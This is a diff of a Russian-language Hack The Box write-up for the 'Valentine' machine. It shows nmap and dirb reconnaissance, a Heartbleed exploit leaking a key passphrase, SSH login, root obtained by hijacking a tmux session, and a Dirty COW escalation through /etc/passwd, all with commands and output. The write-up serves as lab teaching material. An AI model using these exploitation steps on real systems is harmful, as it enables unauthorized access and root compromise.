@@ -23,7 +23,6 @@ comments: true
 Начнем со сканирования хоста. Сперва пробежим быстрое SYN-сканирования 1000 самых распространенных портов:
 ```
 root@kali:~# nmap -n -v -sS -Pn -oN nmap/initial.nmap -g53 10.10.10.79
-
 Nmap scan report for 10.10.10.79
 Host is up (0.099s latency).
 Not shown: 997 closed ports
@@ -39,7 +38,6 @@ Read data files from: /usr/bin/../share/nmap
 После чего посмотрим более подробно на сервисы, крутящиеся на открытых портах:
 ```
 root@kali:~# nmap -n -v -sV -sC -oN nmap/version.nmap -p22,80,443 10.10.10.79
-
 Nmap scan report for 10.10.10.79
 Host is up (0.089s latency).
 
@@ -90,7 +88,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Поищем интересные странички, скрытые от глаз обычного посетителя. Дефолтного словаря утилиты `dirb` будет достаточно:
 ```
 root@kali:~# dirb http://10.10.10.84 -r -o dirb/valentine.dirb
-
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -192,7 +189,6 @@ hackthebox
 С помощью скриптового движка `nmap` подтвердим свое предположение относительно уязвимости сервера к Heartbleed:
 ```
 root@kali:~# nmap -n -v -sS -oN --script=ssl-heartbleed nmap/nse-ssl-heartbleed.nmap -p443 10.10.10.79
-
 Nmap scan report for 10.10.10.79
 Host is up (0.062s latency).
 
@@ -217,7 +213,6 @@ Read data files from: /usr/bin/../share/nmap
 Уязвим! Воспользуемся Heartbleed-эксплойтом для атаки на сервер. Можно применить скрипт "из коробки", входящий в состав Metasploit, но я решил найти решение на просторах GitHub. Выбор пал на [следующий Proof-of-Concept](https://github.com/mpgn/heartbleed-PoC "mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information"), написанный на Пайтоне. После загрузки запустим скрипт:
 ```
 root@kali:~# ./heartbleed-exploit.py 10.10.10.79
-
 Connecting...
 Sending Client Hello...
  ... received message: type = 22, ver = 0302, length = 66
@@ -234,7 +229,6 @@ WARNING : server returned more data than it should - server is vulnerable!
 В файле `out.txt` находится полученная от сервера информация (листинг большой, приведу только интересующую нас часть):
 ```
 root@kali:~# cat out.txt
-
 ...
   00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
   00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
@@ -254,14 +248,12 @@ root@kali:~# cat out.txt
 Из внутрянной памяти сервера вытянули строчку `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`, которую кто-то предположительно вводил в декодер. Переведем в осмысленный текст:
 ```
 root@kali:~# base64 -d <<< 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=='
-
 heartbleedbelievethehype
 ```
 
 Интуиция подсказывает, что сие есть парольная фраза от private-ключа, полученного ранее. Расшифруем ключ:
 ```
 root@kali:~# openssl rsa -in rsa_key -out rsa_key_decrypted
-
 Enter pass phrase for rsa_key: heartbleedbelievethehype
 writing RSA key
 ```
@@ -273,11 +265,10 @@ root@kali:~# chmod 600 rsa_key_decrypted
 
 и перейдем к следующей части.
 
-# SSH — Порт 22
+# SSH — Порт 22 (внутри машины)
 Теперь можно с чистой совестью подключиться к Valentine по SSH (имя пользователя, кстати, пришлось угадывать, к счастью это было не трудно :expressionless:):
 ```
 root@kali:~# ssh -i rsa_key_decrypted hype@10.10.10.79
-
 hype@Valentine:~$ whoami
 hype
 
@@ -288,11 +279,11 @@ hype@Valentine:~$ uname -a
 Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+## user.txt
 Версия ядра нескромно намекает на возможность использования *Dirty COW*, но мы оставим *грязные* способы взломы на крайний случай, а пока заберем флаг пользователя:
 ```
 hype@Valentine:~$ cat Desktop/user.txt
-
-00ff00ff00ff00ff00ff00ff00ff00ff
+e6710a54????????????????????????
 ```
 
 и еще пошаримся по системе.
@@ -301,7 +292,6 @@ hype@Valentine:~$ cat Desktop/user.txt
 Проверим домашний каталог:
 ```
 hype@Valentine:~$ ls -la
-
 total 144
 drwxr-xr-x 21 hype hype  4096 Feb  5  2018 .
 drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
@@ -341,7 +331,6 @@ drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
 `.bash_history` не указывает на `/dev/null`, заглянем:
 ```
 hype@Valentine:~$ cat .bash_history
-
 exit
 exot
 exit
@@ -360,11 +349,9 @@ exit
 Ооо, чувствую себя ребенком ~~на горбушке~~ в конфетной лавке, нам оставили **dev**-сессию! Вкратце о `tmux`: это такая утилита, позволяющая управлять терминальными сессиями, в том числе и "замораживать" текущее их состояние с возможностью последующего возобновления. Что мы и сделаем — восстановим приостановленную сессию из сокета `/.devs/dev_sess`, предварительно посмотрев, какие сессии доступны в принципе:
 ```
 hype@Valentine:~$ tmux -S /.devs/dev_sess ls
-
 0: 1 windows (created Tue Jul 17 12:47:17 2018) [80x24]
 
 hype@Valentine:~$ tmux -S /.devs/dev_sess a -t 0
-
 root@Valentine:/# whoami
 root
 
@@ -372,11 +359,11 @@ root@Valentine:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### root.txt
 Забираем флаг рута и идем радоваться жизни:
 ```
 root@Valentine:/# cat /root/root.txt
-
-ff00ff00ff00ff00ff00ff00ff00ff00
+f1bb6d75????????????????????????
 ```
 
 ## Путь до root'а. Способ 2
@@ -385,9 +372,7 @@ ff00ff00ff00ff00ff00ff00ff00ff00
 Скачав исходник на машину-жертву, соберем и запустим:
 ```
 hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
-
 hype@Valentine:~$ ./dirty
-
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password: qwe123!@#
 Complete line:
@@ -421,17 +406,16 @@ firefart@Valentine:/home/hype# id
 uid=0(firefart) gid=0(root) groups=0(root)
 ```
 
+### root.txt
 Теперь заберем флаг
 ```
 firefart@Valentine:/home/hype# cat /root/root.txt
-
-ff00ff00ff00ff00ff00ff00ff00ff00
+f1bb6d75????????????????????????
 ```
 
 почистим за собой следы
 ```
 firefart@Valentine:/home/hype# mv /tmp/passwd.bak /etc/passwd
-
 firefart@Valentine:/home/hype# exit
 su: User not known to the underlying authentication module
 
